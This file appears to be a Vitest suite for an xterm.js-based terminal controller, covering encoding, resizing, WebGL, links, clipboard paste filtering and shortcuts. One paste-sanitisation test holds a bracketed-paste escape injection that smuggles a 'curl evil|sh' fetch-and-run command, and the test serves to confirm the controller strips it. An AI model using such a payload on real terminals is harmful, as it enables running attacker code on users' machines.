import { afterEach, beforeEach, describe, expect, test, vi } from "vitest";

// xterm and its addons are replaced by recording fakes; the real ones need a canvas and layout.
const h = vi.hoisted(() => ({
  terms: [] as unknown[],
  webgls: [] as unknown[],
  linkHandler: null as null | ((e: MouseEvent, uri: string) => void),
  proposed: { cols: 100, rows: 30 } as { cols: number; rows: number } | undefined,
  found: true,
}));

vi.mock("@xterm/xterm", () => {
  class Terminal {
    cols = 80;
    rows = 24;
    options: Record<string, unknown>;
    written: { data: Uint8Array | string; cb?: () => void }[] = [];
    dataCb: (s: string) => void = () => {};
    binaryCb: (s: string) => void = () => {};
    disposed = false;
    selection = "";
    pasted: string[] = [];
    constructor(opts: Record<string, unknown>) {
      this.options = { ...opts };
      h.terms.push(this);
    }
    onData(cb: (s: string) => void) {
      this.dataCb = cb;
      return { dispose() {} };
    }
    onBinary(cb: (s: string) => void) {
      this.binaryCb = cb;
      return { dispose() {} };
    }
    loadAddon() {}
    open() {}
    write(data: Uint8Array | string, cb?: () => void) {
      this.written.push({ data, cb });
    }
    resize(cols: number, rows: number) {
      this.cols = cols;
      this.rows = rows;
    }
    focus() {}
    hasSelection() {
      return this.selection !== "";
    }
    getSelection() {
      return this.selection;
    }
    paste(s: string) {
      this.pasted.push(s);
    }
    keyHandler: (e: KeyboardEvent) => boolean = () => true;
    attachCustomKeyEventHandler(cb: (e: KeyboardEvent) => boolean) {
      this.keyHandler = cb;
    }
    dispose() {
      this.disposed = true;
    }
  }
  return { Terminal };
});
vi.mock("@xterm/addon-fit", () => ({
  FitAddon: class {
    proposeDimensions() {
      return h.proposed;
    }
  },
}));
vi.mock("@xterm/addon-search", () => ({
  SearchAddon: class {
    findNext() {
      return h.found;
    }
    findPrevious() {
      return h.found;
    }
    clearDecorations() {}
  },
}));
vi.mock("@xterm/addon-web-links", () => ({
  WebLinksAddon: class {
    constructor(handler: (e: MouseEvent, uri: string) => void) {
      h.linkHandler = handler;
    }
  },
}));
vi.mock("@xterm/addon-webgl", () => ({
  WebglAddon: class {
    disposed = false;
    lost: () => void = () => {};
    throwOnDispose = false;
    constructor() {
      h.webgls.push(this);
    }
    onContextLoss(cb: () => void) {
      this.lost = cb;
      return { dispose() {} };
    }
    dispose() {
      this.disposed = true;
      if (this.throwOnDispose) throw new Error("gone");
    }
  },
}));

import { TerminalController } from "./controller";

interface FakeTerm {
  cols: number;
  rows: number;
  options: Record<string, unknown>;
  written: { data: Uint8Array | string; cb?: () => void }[];
  dataCb: (s: string) => void;
  binaryCb: (s: string) => void;
  selection: string;
  pasted: string[];
  keyHandler: (e: KeyboardEvent) => boolean;
}
interface FakeWebgl {
  disposed: boolean;
  lost: () => void;
  throwOnDispose: boolean;
}

const term = () => h.terms[h.terms.length - 1] as FakeTerm;
const webgl = (i: number) => h.webgls[i] as FakeWebgl;

function sized(el: HTMLElement, w: number, hgt: number) {
  Object.defineProperty(el, "clientWidth", { configurable: true, value: w });
  Object.defineProperty(el, "clientHeight", { configurable: true, value: hgt });
}

function setup(opts = { fontFamily: null as string | null, fontSize: 14, scrollback: 1000 }) {
  const deps = {
    onSearchRequest: vi.fn<() => void>(),
    onData: vi.fn<(b: Uint8Array) => void>(),
    onResize: vi.fn<(c: number, r: number) => void>(),
    onAck: vi.fn<(n: number) => void>(),
    openUrl: vi.fn<(u: string) => void>(),
    readClipboard: vi.fn<() => Promise<string>>(async () => "pasted"),
  };
  const c = new TerminalController(opts, deps);
  const el = document.createElement("div");
  document.body.append(el);
  c.mount(el);
  return { c, el, deps };
}

beforeEach(() => {
  h.terms.length = 0;
  h.webgls.length = 0;
  h.linkHandler = null;
  h.proposed = { cols: 100, rows: 30 };
  h.found = true;
  document.documentElement.style.setProperty("--terminal-min-contrast", "4.5");
});
afterEach(() => {
  vi.useRealTimers();
  vi.restoreAllMocks();
  Reflect.deleteProperty(navigator, "clipboard");
  document.body.innerHTML = "";
  document.documentElement.removeAttribute("style");
});

describe("TerminalController", () => {
  test("onData_sends_utf8_bytes_and_onBinary_sends_latin1_bytes", () => {
    const { deps } = setup();
    term().dataCb("a€");
    expect([...deps.onData.mock.calls[0]![0]]).toEqual([0x61, 0xe2, 0x82, 0xac]);
    term().binaryCb("\x00\xff\x80");
    expect([...deps.onData.mock.calls[1]![0]]).toEqual([0x00, 0xff, 0x80]);
  });

  test("write_acks_the_byte_count_after_xterm_has_written", () => {
    const { c, deps } = setup();
    c.write(new Uint8Array([1, 2, 3, 4, 5]));
    expect(deps.onAck).not.toHaveBeenCalled();
    term().written[0]!.cb!();
    expect(deps.onAck).toHaveBeenCalledWith(5);
  });

  test("fit_while_hidden_sends_nothing", () => {
    const { c, el, deps } = setup();
    sized(el, 0, 0);
    c.fit();
    expect(deps.onResize).not.toHaveBeenCalled();
    expect(term().cols).toBe(80);
  });

  test("fit_after_show_sends_the_size_once", () => {
    const { c, el, deps } = setup();
    sized(el, 800, 600);
    c.setVisible(true);
    c.fit();
    c.fit();
    expect(deps.onResize).toHaveBeenCalledTimes(1);
    expect(deps.onResize).toHaveBeenCalledWith(100, 30);
    expect(term().cols).toBe(100);
  });

  test("webgl_is_loaded_only_while_visible_and_disposed_on_hide", () => {
    const { c } = setup();
    expect(h.webgls).toHaveLength(0);
    c.setVisible(true);
    c.setVisible(true);
    expect(h.webgls).toHaveLength(1);
    c.setVisible(false);
    expect(webgl(0).disposed).toBe(true);
    c.setVisible(true);
    expect(h.webgls).toHaveLength(2);
  });

  test("webgl_context_loss_falls_back_without_throwing", () => {
    const { c } = setup();
    c.setVisible(true);
    webgl(0).throwOnDispose = true;
    expect(() => webgl(0).lost()).not.toThrow();
    expect(webgl(0).disposed).toBe(true);
    // the next hide has nothing left to dispose
    expect(() => c.setVisible(false)).not.toThrow();
  });

  test("minimum_contrast_ratio_comes_from_the_token", () => {
    document.documentElement.style.setProperty("--terminal-min-contrast", "7");
    setup();
    expect(term().options.minimumContrastRatio).toBe(7);
  });

  test("setOptions_updates_font_size_and_scrollback_live", () => {
    const { c, el } = setup();
    sized(el, 800, 600);
    c.setOptions({ fontFamily: "Fira Code", fontSize: 18, scrollback: 5000 });
    expect(term().options.fontSize).toBe(18);
    expect(term().options.scrollback).toBe(5000);
    expect(String(term().options.fontFamily)).toContain("Fira Code");
  });

  test("links_call_openUrl_and_never_navigate", () => {
    const { deps } = setup();
    const preventDefault = vi.fn();
    h.linkHandler!({ preventDefault } as unknown as MouseEvent, "https://example.com/x");
    expect(deps.openUrl).toHaveBeenCalledWith("https://example.com/x");
    expect(preventDefault).toHaveBeenCalled();
  });

  test("search_returns_whether_a_match_was_found", () => {
    const { c } = setup();
    h.found = true;
    expect(c.search("x", "next")).toBe(true);
    h.found = false;
    expect(c.search("x", "previous")).toBe(false);
    expect(c.search("", "next")).toBe(false);
  });

  test("copy_uses_the_browser_clipboard", async () => {
    const { c } = setup();
    const writeText = vi.fn(async () => {});
    Object.defineProperty(navigator, "clipboard", { configurable: true, value: { writeText } });
    term().selection = "sel";
    await c.copySelection();
    expect(writeText).toHaveBeenCalledWith("sel");
  });

  test("menu_paste_reads_through_the_native_command_and_writes_the_text", async () => {
    const { c, deps } = setup();
    const readText = vi.fn(async () => "browser");
    Object.defineProperty(navigator, "clipboard", { configurable: true, value: { readText } });
    await c.paste();
    expect(deps.readClipboard).toHaveBeenCalledOnce();
    expect(readText).not.toHaveBeenCalled();
    expect(term().pasted).toEqual(["pasted"]);
  });

  test("menu_paste_cannot_end_bracketed_paste_early", async () => {
    // M11 review #31: an embedded end marker would end paste mode and run the rest as typed input
    const { c, deps } = setup();
    deps.readClipboard.mockResolvedValueOnce("a\x1b[201~b");
    await c.paste();
    expect(term().pasted).toEqual(["ab"]);
    expect(term().pasted.join("")).not.toContain("\x1b");
  });

  test("a_native_paste_event_is_filtered_before_xterm_sees_it", () => {
    const { el } = setup();
    // xterm's own paste listeners sit on elements inside the mount element
    const inner = document.createElement("textarea");
    el.append(inner);
    const reachedXterm = vi.fn();
    inner.addEventListener("paste", reachedXterm);
    const e = new Event("paste", { bubbles: true, cancelable: true });
    Object.defineProperty(e, "clipboardData", {
      value: { getData: () => "ls\x1b[201~\rcurl evil|sh\r\x1b[200~" },
    });
    inner.dispatchEvent(e);
    expect(e.defaultPrevented).toBe(true);
    expect(reachedXterm).not.toHaveBeenCalled();
    expect(term().pasted).toEqual(["ls\rcurl evil|sh\r"]);
  });

  test("pasted_text_keeps_tab_and_line_ends_and_loses_other_controls", async () => {
    const { c, deps } = setup();
    deps.readClipboard.mockResolvedValueOnce(
      "a\tb\nc\r\nd\x00\x07\x08\x7f\u0085\u009b31m\x1b]0;x\x07é€",
    );
    await c.paste();
    expect(term().pasted).toEqual(["a\tb\nc\r\nd31m]0;xé€"]);
    // nothing left after filtering pastes nothing
    deps.readClipboard.mockResolvedValueOnce("\x1b\x1b[201~");
    await c.paste();
    expect(term().pasted).toHaveLength(1);
  });

  test("osc8_links_go_through_openUrl_without_confirm_or_window_open", () => {
    // M11 review #58: xterm's default would show a server-worded confirm() and call window.open()
    const { deps } = setup();
    const confirm = vi.spyOn(window, "confirm").mockReturnValue(true);
    const open = vi.spyOn(window, "open").mockReturnValue(null);
    const handler = term().options.linkHandler as {
      activate(e: MouseEvent, uri: string): void;
      allowNonHttpProtocols?: boolean;
    };
    expect(handler).toBeTruthy();
    expect(handler.allowNonHttpProtocols).toBeFalsy();
    const preventDefault = vi.fn();
    handler.activate({ preventDefault } as unknown as MouseEvent, "https://example.com/osc8");
    expect(deps.openUrl).toHaveBeenCalledWith("https://example.com/osc8");
    expect(preventDefault).toHaveBeenCalled();
    expect(confirm).not.toHaveBeenCalled();
    expect(open).not.toHaveBeenCalled();
  });

  test("menu_paste_failure_shows_nothing_and_does_not_hang", async () => {
    const { c, deps } = setup();
    deps.readClipboard.mockRejectedValueOnce({ code: "clipboard_unavailable", message: "x" });
    await expect(c.paste()).resolves.toBeUndefined();
    expect(term().pasted).toEqual([]);
    expect(deps.onData).not.toHaveBeenCalled();
  });
});

describe("TerminalController key handling", () => {
  const key = (
    k: string,
    mods: Partial<Record<"ctrl" | "shift" | "alt" | "meta", boolean>> = {},
  ) => {
    const e = new KeyboardEvent("keydown", {
      key: k,
      ctrlKey: !!mods.ctrl,
      shiftKey: !!mods.shift,
      altKey: !!mods.alt,
      metaKey: !!mods.meta,
      cancelable: true,
    });
    const stop = vi.spyOn(e, "stopPropagation");
    return { e, stop };
  };

  function press(k: string, mods: Parameters<typeof key>[1] = {}) {
    const { e, stop } = key(k, mods);
    const result = term().keyHandler(e);
    return { result, prevented: e.defaultPrevented, stopped: stop.mock.calls.length > 0 };
  }

  function withClipboard() {
    const writeText = vi.fn(async () => {});
    Object.defineProperty(navigator, "clipboard", { configurable: true, value: { writeText } });
    term().selection = "sel";
    return writeText;
  }

  test("keys_for_the_program_go_to_xterm", () => {
    setup();
    for (const [k, m] of [
      ["c", { ctrl: true }],
      ["w", { ctrl: true }],
      ["b", { alt: true }],
      ["Escape", {}],
    ] as const) {
      const r = press(k, m);
      expect(r.result, k).toBe(true);
      expect(r.prevented, k).toBe(false);
    }
  });

  test("ctrl_shift_c_copies_and_ctrl_shift_f_searches_on_non_mac", () => {
    const { deps } = setup();
    const writeText = withClipboard();
    const copy = press("C", { ctrl: true, shift: true });
    expect(copy).toEqual({ result: false, prevented: true, stopped: true });
    expect(writeText).toHaveBeenCalledWith("sel");
    const search = press("F", { ctrl: true, shift: true });
    expect(search).toEqual({ result: false, prevented: true, stopped: true });
    expect(deps.onSearchRequest).toHaveBeenCalledTimes(1);
  });

  test("tab_close_filter_and_paste_chords_bubble_to_the_window", () => {
    setup();
    for (const [k, m] of [
      ["Tab", { ctrl: true }],
      ["W", { ctrl: true, shift: true }],
      ["K", { ctrl: true, shift: true }],
      ["V", { ctrl: true, shift: true }],
    ] as const) {
      const r = press(k, m);
      expect(r, k).toEqual({ result: false, prevented: false, stopped: false });
    }
  });

  test("on_mac_cmd_c_copies_cmd_f_searches_and_ctrl_shift_c_goes_to_the_program", () => {
    vi.spyOn(navigator, "platform", "get").mockReturnValue("MacIntel");
    const { deps } = setup();
    const writeText = withClipboard();
    expect(press("c", { meta: true })).toMatchObject({ result: false, prevented: true });
    expect(writeText).toHaveBeenCalledWith("sel");
    expect(press("f", { meta: true })).toMatchObject({ result: false, prevented: true });
    expect(deps.onSearchRequest).toHaveBeenCalledTimes(1);
    expect(press("C", { ctrl: true, shift: true })).toEqual({
      result: true,
      prevented: false,
      stopped: false,
    });
  });
});
